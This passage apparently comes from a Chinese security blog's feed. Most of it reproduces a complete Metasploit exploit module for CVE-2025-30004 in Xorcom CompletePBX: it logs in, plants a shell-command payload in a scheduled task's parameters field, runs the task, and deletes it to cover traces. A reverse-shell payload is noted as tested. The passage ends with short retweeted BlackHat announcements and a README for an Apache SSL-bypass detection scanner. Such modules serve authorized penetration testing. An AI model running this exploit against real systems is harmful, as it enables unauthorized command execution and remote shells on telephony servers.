livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Xorcom CompletePBX Authenticated Command Injection via Task Scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits an authenticated command injection vulnerability <span class="hljs-keyword">in</span> Xorcom CompletePBX<br>          versions &lt;= <span class="hljs-number">5.2</span>.<span class="hljs-number">35.</span> The issue resides <span class="hljs-keyword">in</span> the task scheduler functionality, where user-controlled<br>          input <span class="hljs-keyword">is</span> improperly sanitized, allowing arbitrary command execution <span class="hljs-keyword">with</span> web server privileges.<br><br>          Only the superadmin user (admin) has the necessary permissions <span class="hljs-keyword">to</span> trigger this exploit.<br>          Even <span class="hljs-keyword">when</span> creating a <span class="hljs-keyword">new</span> user <span class="hljs-keyword">with</span> maximum privileges, the vulnerability does <span class="hljs-keyword">not</span> work.<br>        &#125;,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Valentin Lobstein&#x27;</span> <span class="hljs-comment"># Research and module development</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-30004&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://www.xorcom.com/products/completepbx/&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://chocapikk.com/posts/2025/completepbx/&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_CMD],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Unix/Linux Command Shell&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>              <span class="hljs-comment"># tested with cmd/linux/http/x64/meterpreter/reverse_tcp</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-03-02&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX password&#x27;</span>]),<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is running CompletePBX...&#x27;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;No response from target.&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br><br>    doc = res.get_html_document<br><br>    <span class="hljs-keyword">if</span> doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;description&quot;][@content=&quot;CompletePBX&quot;]&#x27;</span>) ||<br>       doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;application-name&quot;][@content=&quot;Ombutel&quot;]&#x27;</span>)<br><br>      print_good(<span class="hljs-string">&quot;Detected CompletePBX on <span class="hljs-subst">#&#123;peer&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">return</span> Exploit::CheckCode::Appears<br>    end<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Target does not appear to be running CompletePBX.&#x27;</span>)<br>  end<br><br>  def login<br>    print_status(<span class="hljs-string">&quot;Attempting authentication with username: <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;userid&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;userpass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target&#x27;</span>)<br>    end<br><br>    <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>)<br>    end<br><br>    sid_cookie = res.get_cookies.scan(<span class="hljs-regexp">/sid=[a-f0-9]+/</span>).first<br><br>    <span class="hljs-keyword">unless</span> sid_cookie<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Authentication failed: No session ID received&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Authentication successful! Session ID: <span class="hljs-subst">#&#123;sid_cookie&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> sid_cookie<br>  end<br><br>  def get_latest_task_id(sid_cookie, task_desc)<br>    print_status(<span class="hljs-string">&quot;Retrieving latest task ID for description: <span class="hljs-subst">#&#123;task_desc&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;tasks&#x27;</span>,<br>        <span class="hljs-string">&#x27;offset&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;max&#x27;</span> =&gt; <span class="hljs-string">&#x27;20&#x27;</span>,<br>        <span class="hljs-string">&#x27;search&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while fetching tasks&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    tasks = json_res[<span class="hljs-string">&#x27;rows&#x27;</span>]<br><br>    <span class="hljs-keyword">unless</span> tasks<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to retrieve task list&#x27;</span>)<br>    end<br><br>    tasks.each <span class="hljs-keyword">do</span> |task|<br>      <span class="hljs-keyword">if</span> task[<span class="hljs-number">2</span>] == task_desc<br>        print_good(<span class="hljs-string">&quot;Found task with ID: <span class="hljs-subst">#&#123;task[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> task[<span class="hljs-number">0</span>]<br>      end<br>    end<br><br>    fail_with(Failure::NotFound, <span class="hljs-string">&quot;Could not find the task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br>  end<br><br>  def create_task(sid_cookie)<br>    task_desc = Faker::Lorem.sentence(word_count: <span class="hljs-number">4</span>)<br>    notes = Faker::Lorem.paragraph(sentence_count: <span class="hljs-number">3</span>)<br>    print_status(<span class="hljs-string">&quot;Creating malicious scheduled task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;script&#x27;</span> =&gt; <span class="hljs-string">&#x27;backup&#x27;</span>,<br>        <span class="hljs-string">&#x27;description&#x27;</span> =&gt; task_desc,<br>        <span class="hljs-string">&#x27;starting&#x27;</span> =&gt; Time.now.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>),<br>        <span class="hljs-string">&#x27;interval&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;interval_unit&#x27;</span> =&gt; <span class="hljs-string">&#x27;month&#x27;</span>,<br>        <span class="hljs-string">&#x27;parameters&#x27;</span> =&gt; <span class="hljs-string">&quot;$(<span class="hljs-subst">#&#123;payload.encoded&#125;</span>)&quot;</span>,<br>        <span class="hljs-string">&#x27;notes&#x27;</span> =&gt; notes,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;save_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;create&#x27;</span><br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while creating task&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    state = json_res[<span class="hljs-string">&#x27;state&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> state == <span class="hljs-string">&#x27;success&#x27;</span><br>      print_good(<span class="hljs-string">&#x27;Malicious task successfully created.&#x27;</span>)<br>      <span class="hljs-keyword">return</span> task_desc<br>    <span class="hljs-keyword">else</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to create the malicious task&#x27;</span>)<br>    end<br>  end<br><br>  def run_task(sid_cookie, task_id)<br>    print_status(<span class="hljs-string">&quot;Executing malicious task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;run_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;run&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while executing task&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&#x27;Task executed successfully!&#x27;</span>)<br>  end<br><br>  def delete_task(sid_cookie, task_id)<br>    %w[<span class="hljs-keyword">delete</span> deleteConfirmed].each <span class="hljs-keyword">do</span> |mode|<br>      print_status(<span class="hljs-string">&quot;Sending delete request (mode=<span class="hljs-subst">#&#123;mode&#125;</span>) for task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>      send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>        <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;delete_task&#x27;</span>,<br>          <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; mode,<br>          <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>        &#125;<br>      &#125;)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Task <span class="hljs-subst">#&#123;task_id&#125;</span> deleted successfully!&quot;</span>)<br>  end<br><br>  def exploit<br>    sid_cookie = login<br>    task_desc = create_task(sid_cookie)<br>    task_id = get_latest_task_id(sid_cookie, task_desc)<br>    run_task(sid_cookie, task_id)<br>    delete_task(sid_cookie, task_id)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Xorcom CompletePBX Authenticated Comman</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_604769248/"/>
    <id>http://example.com/2025/06/30/twitter_604769248/</id>
    <published>2025-06-30T16:01:11.787Z</published>
    <updated>2025-06-30T16:01:11.788Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @surya4n6: 抢占我们罕见的企业级macOS蓝队培训席位。实践实验室，真实世界威胁检测与数字取证及事件响应（DFIR）@…</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939705097564393849">https://x.com/BlackHatEvents/status/1939705097564393849</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @surya4n6: 抢占我们罕见的企业级macOS蓝队培训席位。实践实验室，真实世界威胁检测与数字取证及事件响应（DFIR）@…&lt;/p&gt;
</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_1687137571/"/>
    <id>http://example.com/2025/06/30/twitter_1687137571/</id>
    <published>2025-06-30T16:01:02.465Z</published>
    <updated>2025-06-30T16:01:02.463Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @SecureYeti：教导你的员工成为你最强大的捍卫者！Secure Yeti的@jaysonstreet提供的培训将帮助你让安全变得“平易近人”…</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939705417518415996">https://x.com/BlackHatEvents/status/1939705417518415996</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @SecureYeti：教导你的员工成为你最强大的捍卫者！Secure Yeti的@jaysonstreet提供的培训将帮助你让安全变得“平</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_1924812840/"/>
    <id>http://example.com/2025/06/30/twitter_1924812840/</id>
    <published>2025-06-30T16:00:56.566Z</published>
    <updated>2025-06-30T16:00:56.563Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @getsquarex: SquareX的Audrey Adeline将在Black Hat (@BlackHatEvents) 的“网络安全先锋指南”小组讨论中发言。</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939714203612225980">https://x.com/BlackHatEvents/status/1939714203612225980</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @getsquarex: SquareX的Audrey Adeline将在Black Hat (@BlackHatEvents) 的“网络安</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Apache HTTP Server SSL证书验证绕过漏洞</title>
    <link href="http://example.com/2025/06/30/github_481563331/"/>
    <id>http://example.com/2025/06/30/github_481563331/</id>
    <published>2025-06-30T16:00:19.287Z</published>
    <updated>2025-06-30T16:00:19.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server SSL证书验证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-40898</li></ul><p><strong>漏洞类型：</strong> 配置问题</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2024-40898是Apache HTTP Server中的一个安全漏洞，允许攻击者在特定条件下绕过SSL证书验证，可能导致TLS上的中间人攻击(MitM)。此Python脚本是一个概念验证(PoC)扫描器，用于检测该漏洞。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache HTTP Server</p><p><strong>来源：</strong> <a href="https://github.com/ForceEA001/CVE-2024-40898-SSL-Bypass-Detection">https://github.com/ForceEA001/CVE-2024-40898-SSL-Bypass-Detection</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.gitignore</li><li>CVE-2024-40898-SSL-Bypass-Detection</li><li>LICENSE</li><li>README.md</li><li>check_cve_40898.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><p>CVE-2024-40898 SSL Certificate Validation Bypass Scanner</p><p>This repository contains a Python-based proof-of-concept (PoC) script to detect <em>CVE-2024-40898</em>, a vulnerability in Apache HTTP Server that allows attackers to bypass SSL certificate verification.</p><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>CVE-2024-40898 is a security issue in Apache HTTP Server which, under certain conditions, permits clients to bypass certificate validation. This can potentially allow man-in-the-middle (MitM) attacks over TLS.</p><h3 id="What-this-script-does"><a href="#What-this-script-does" class="headerlink" title="What this script does"></a>What this script does</h3><ul><li>Reads a list of host:port pairs from ssl-ports.txt.</li><li>For each entry:<ul><li>Establishes a TLS connection using a custom SSL context that disables certificate validation.</li><li>Sends a HEAD &#x2F; request to the server.</li><li>Examines the response:<ul><li>If the response includes 200 OK, the target is considered <em>potentially vulnerable</em>.</li><li>If no such response is returned, the target is marked as <em>safe</em>.</li><li>If any exception occurs during connection, the result is recorded as an <em>error</em>.</li></ul></li></ul></li></ul><h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><ul><li>Python 3.x</li></ul><h3 id="How-to-Use"><a href="#How-to-Use" class="headerlink" title="How to Use"></a>How to Use</h3><ol><li>Prepare your ssl-ports.txt file with a list of targets, one per line, in the format:<br>domain.com:443<br>example.org:443<ol start="2"><li>Run the script:</li></ol><pre><code class="language-bash"></code></pre></li></ol><p>python3 check_cve_40898.py<br>3.The output will label each domain as:<br>•[VULNERABLE] – possible certificate validation bypass<br>•[SAFE] – no issue detected<br>•[ERROR] – failed connection or SSL error<br> Disclaimer</p><p>This tool is provided for educational and testing purposes only. Ensure you have permission to scan the listed domains. The author is not responsible for any misuse of this code.</p><p>License</p><p>This project is licensed under the MIT License.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache HTTP Server SSL证书验证绕过漏洞&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
